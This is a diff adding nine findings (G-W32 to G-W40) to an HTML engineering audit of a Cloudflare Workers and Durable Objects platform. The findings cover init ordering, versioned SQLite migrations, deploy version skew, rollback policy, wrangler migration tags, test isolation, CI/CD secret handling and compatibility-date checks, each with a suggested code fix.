+  for (const ws of this.ctx.getWebSockets()) {
+    try {
+      ws.send(data);
+    } catch {
+      // Socket is dead/closing — prune it, keep delivering to the rest
+      try { ws.close(1011, "send failed"); } catch {}
+    }
+  }
+}
+```
+If using the SDK's native `this.broadcast()`, this isolation is handled — another reason to prefer it (see Appendix S).</p></div>
+</div>
+<div id="G-W32" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W32</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Orchestration — Lifecycle — NaelaoAgentDO / onConnect ordering</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">onConnect can fire before schema/state is initialized — handlers read undefined state</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">There is no guaranteed ordering that the DO's SQLite schema and initial state are fully loaded before `onConnect()` runs for an incoming WebSocket. If `onConnect()` (or the first message handler) reads `this.state.sessionId` or queries a table, it can hit undefined state or a not-yet-created table on a cold DO, causing intermittent errors that only appear under cold-start + immediate-connect timing.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Gate all entry points behind an init promise via blockConcurrencyWhile:
+```typescript
+constructor(ctx: DurableObjectState, env: Env) {
+  super(ctx, env);
+  ctx.blockConcurrencyWhile(async () =&gt; {
+    await this.initSchema();        // CREATE TABLE IF NOT EXISTS + migrations
+    await this.loadState();         // hydrate this.state from SQLite
+    this.ready = true;
+  });
+}
+async onConnect(ws: WebSocket) {
+  // blockConcurrencyWhile guarantees init finished before any handler runs,
+  // but assert defensively for clarity:
+  if (!this.ready) throw new Error("not initialized");
+  // ... safe to read state
+}
+```</p></div>
+</div>
+<div id="G-W33" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W33</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#EF4444;background:#EF444418;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">CRITICAL</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — Migrations — platform / DO schema migration system</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No versioned migration system — schema changes cannot be applied to a live fleet of thousands of DOs</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">DO schema is created with `CREATE TABLE IF NOT EXISTS` in the constructor. This is idempotent but not versionable: there is no `PRAGMA user_version` tracking, no migration runner, and no path to apply `ALTER TABLE`/backfill changes to DOs that already exist. When a new column or table is needed, existing DOs never receive it (queries return NULL or error), and there is no way to coordinate or observe migration progress across the fleet.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Add a versioned migration runner keyed on PRAGMA user_version, run on every wake:
+```typescript
+private migrations: ((sql: SqlStorage) =&gt; void)[] = [
+  (sql) =&gt; sql.exec("CREATE TABLE messages (...)"),                 // v1
+  (sql) =&gt; sql.exec("ALTER TABLE messages ADD COLUMN workspace_id TEXT"), // v2
+  (sql) =&gt; { /* backfill */ },                                     // v3
+];
+private migrate() {
+  const cur = Number([...this.ctx.storage.sql.exec("PRAGMA user_version")][0].user_version);
+  for (let v = cur; v &lt; this.migrations.length; v++) {
+    this.migrations[v](this.ctx.storage.sql);
+    this.ctx.storage.sql.exec(`PRAGMA user_version = ${v + 1}`);
+  }
+}
+// Call inside blockConcurrencyWhile in the constructor so it runs once per wake.
+```</p></div>
+</div>
+<div id="G-W34" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W34</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#EF4444;background:#EF444418;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">CRITICAL</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — Migrations — platform / hibernated DO schema drift</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Hibernated DOs wake with stale schema after a schema-changing deploy — drift between dormant and active instances</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">A new deploy ships schema changes, but a DO that has been hibernated for days does not run any code (and thus no migration) until its next wake. Between deploy and wake, the fleet is split: recently-active DOs may have run the new init path while dormant ones still have the old schema. Without a migration runner (G-W33) that reconciles on wake, a dormant DO can wake and run queries against a schema that does not match the deployed code, corrupting state or failing silently. This interaction is not covered by the chaos test suite.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Ensure the migration runner (G-W33) runs unconditionally on every wake, and make all queries schema-version-tolerant:
+```typescript
+// In constructor, before serving any request:
+this.ctx.blockConcurrencyWhile(async () =&gt; this.migrate());
+```
+Add tests that explicitly exercise the dormant→deploy→wake path:
+```typescript
+it("dormant DO migrates on wake after schema-change deploy", async () =&gt; {
+  const id = newDOWithSchemaV1();
+  deploySchemaV2();                 // bump migration list
+  const woken = await wake(id);      // must run v1-&gt;v2 migration on wake
+  expect(await woken.userVersion()).toBe(2);
+});
+```</p></div>
+</div>
+<div id="G-W35" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W35</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — Atomicity — platform / version skew</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Deploying 22 Workers is non-atomic — a skew window breaks Service Binding contracts between callers and callees</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The platform is ~22 Workers deployed via `wrangler deploy`. Deploys are per-Worker and not atomic across the fleet, so during a rollout there is a window where some Workers run the new version and others the old. If a new caller expects a v2 Service Binding contract (new field, renamed route) while the callee is still v1 (or vice versa), inter-Worker calls fail or behave incorrectly for the duration of the skew. No compatibility strategy is documented.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Make Service Binding contracts backward/forward compatible and deploy callees first:
+```
+// 1. Expand-then-contract: add new fields/routes as ADDITIVE first (callee tolerates
+//    both old and new request shapes), deploy callees, then deploy callers, then
+//    remove the old shape in a later release.
+// 2. Version the internal contract explicitly:
+```
+```typescript
+await env.NAELAO_BILLING.fetch(new Request("http://billing/v2/usage", {
+  headers: { "x-contract-version": "2" }, /* ... */
+}));
+// Callee handles both /v1/ and /v2/ during the transition.
+```
+Deploy in dependency order (leaf services first) and never remove a contract in the same release that introduces its replacement.</p></div>
+</div>
+<div id="G-W36" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W36</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#F97316;background:#F9731618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">HIGH</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — Rollback — platform / schema rollback</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No rollback strategy for schema-changing deploys — DO SQLite changes are not backward-compatible</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">There is no documented rollback procedure. Rolling back Worker code is straightforward, but if a deploy applied a DO SQLite migration (dropped a column, changed a constraint, backfilled data), rolling the code back to the previous version leaves it running against a schema it does not understand. Destructive migrations (DROP, type changes) are irreversible, so a bad deploy that includes one cannot be safely undone.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Make migrations rollback-safe by policy and keep code compatible across one version:
+```
+// Migration rules:
+//  - Only ADDITIVE migrations in a normal deploy (add column/table/index).
+//  - Never DROP or rename in the same release that stops using the old shape.
+//  - Destructive cleanup happens N releases later, after rollback window closes.
+//  - New code must read BOTH old and new schema for one release (tolerant reads).
+```
+For data backfills, write to new columns while still maintaining old ones until the rollback window passes; only then switch reads and, later, drop the old columns.</p></div>
+</div>
+<div id="G-W37" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W37</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — Config — wrangler / DO migration tag</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">wrangler.jsonc has no migration tags — renaming or deleting a DO class will fail or break instances</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Cloudflare requires a `migrations` block with a tag (and `renamed_classes`/`deleted_classes` directives) in wrangler config whenever a Durable Object class is renamed or removed. None of the ~14 DO bindings declare migration tags. A future refactor that renames `NaelaoAgentDO` will either be rejected by wrangler or, worse, strand all existing instances of the old class with no way to address them.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Declare DO migrations with tags from the start:
+```jsonc
+{
+  "durable_objects": { "bindings": [ /* ... */ ] },
+  "migrations": [
+    { "tag": "v1", "new_classes": ["NaelaoAgentDO", "AssistantDO", "WalletDO", "SpaceDO"] },
+    // Future rename:
+    { "tag": "v2", "renamed_classes": [{ "from": "NaelaoAgentDO", "to": "AgentDO" }] }
+    // Future delete (only after instances drained):
+    // { "tag": "v3", "deleted_classes": ["LegacyDO"] }
+  ]
+}
+```
+Never rename/delete a DO class without a corresponding migration tag.</p></div>
+</div>
+<div id="G-W38" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W38</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Testing — Isolation — test harness / Service Binding isolation</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Per-test DO isolation via random IDs does not isolate Service Bindings — tests cross-contaminate via inter-Worker calls</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">Tests isolate DO instances by using fresh `crypto.randomUUID()` IDs per test, but Service Bindings between test Workers are not isolated: a test exercising naelao-router that triggers a Service Binding call into naelao-spaces hits the shared test instance of that Worker, whose DO namespace and any module-scope state are common across tests. Tests marked `concurrent` can therefore pollute each other through the binding layer even though their DO IDs differ.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Isolate cross-Worker state per test and avoid module-scope mutable state:
+```typescript
+// Namespace all DO IDs created via Service Bindings with a per-test prefix
+const testPrefix = `test-${crypto.randomUUID()}`;
+// Pass it through so downstream Workers derive DO names within the test namespace
+// e.g. idFromName(`${testPrefix}:space:${id}`)
+
+// Run cross-binding integration tests serially, not concurrently:
+describe.sequential("router -&gt; spaces integration", () =&gt; { /* ... */ });
+```
+Forbid module-scope mutable state in Workers; keep all state in DO storage keyed by the test-prefixed names.</p></div>
+</div>
+<div id="G-W39" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W39</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — CI/CD — pipeline / CI and secret handling</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">No CI/CD pipeline, deploy ordering, or secret-handling documented for the 22-Worker fleet</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">There is no `.github/workflows` or equivalent CI/CD definition. The spec does not specify how the 22 Workers are linted, tested, and deployed; in what order (which matters for version skew, G-W35); whether deploys are automated or manual; or how deployment secrets (`NAELAO_JWT_SECRET`, the CF API token, signing keys) are stored and injected. This leaves deployment ad hoc and secret handling undefined — a significant operational and security gap.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Define a CI/CD pipeline with ordered deploys and secret hygiene:
+```yaml
+# .github/workflows/deploy.yml (sketch)
+jobs:
+  test:    { steps: [ checkout, "npm ci", "npm run test" ] }   # vitest-pool-workers
+  deploy:
+    needs: test
+    steps:
+      # Deploy in dependency order: leaf services first, edge router last
+      - run: wrangler deploy --config workers/naelao-credentials/wrangler.jsonc
+      - run: wrangler deploy --config workers/naelao-billing/wrangler.jsonc
+      # ... then dependent services ...
+      - run: wrangler deploy --config workers/naelao-router/wrangler.jsonc
+    env:
+      CLOUDFLARE_API_TOKEN: ${{ secrets.CF_API_TOKEN }}   # GitHub Secrets, never in repo
+```
+Use `wrangler secret put` for runtime secrets; never bake them into wrangler.jsonc or env vars in the repo.</p></div>
+</div>
+<div id="G-W40" style="margin:40px 0 0;padding:28px 0 0;border-top:1px solid var(--brd);">
+<div style="display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px;">
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--or);letter-spacing:.12em;text-transform:uppercase;">G-W40</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#3B82F6;background:#3B82F618;padding:2px 8px;border-radius:4px;letter-spacing:.08em;">MEDIUM</span>
+<span style="font-family:'DM Mono',monospace;font-size:10px;color:#64748B;letter-spacing:.06em;">§Deployment — Config — wrangler / compatibility_date consistency</span>
+</div>
+<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">compatibility_date not validated for consistency across dev/test/prod environments</h3>
+<div class="box box-rd"><div class="box-lbl">The Gap</div>
+<p style="white-space:pre-wrap;">The vitest config and the root wrangler.jsonc both pin `compatibility_date` to the same value, but there is no check that every per-Worker and per-environment wrangler config (especially production) sets a consistent, intentional date. A missing or mismatched `compatibility_date` across environments changes runtime semantics (which APIs and behaviors are active), so a Worker can behave differently in prod than in test for reasons unrelated to code — a class of bug that is very hard to diagnose.</p></div>
+<div class="box box-gr"><div class="box-lbl">Required Fix</div>
+<p style="white-space:pre-wrap;">Centralize and assert the compatibility date:
+```typescript
+// scripts/check-compat-date.ts — run in CI before deploy
+import { readFileSync, globSync } from "node:fs";
+const EXPECTED = "2026-05-01";
+for (const cfg of globSync("workers/**/wrangler.jsonc")) {
+  const d = JSON.parse(stripJsonc(readFileSync(cfg, "utf8"))).compatibility_date;
+  if (d !== EXPECTED) throw new Error(`${cfg}: compatibility_date ${d} != ${EXPECTED}`);
+}
+```
+When bumping the date, bump it everywhere in one change and re-run the full test suite against the new date.</p></div>
+</div>
+
 </section>
 
 </body>
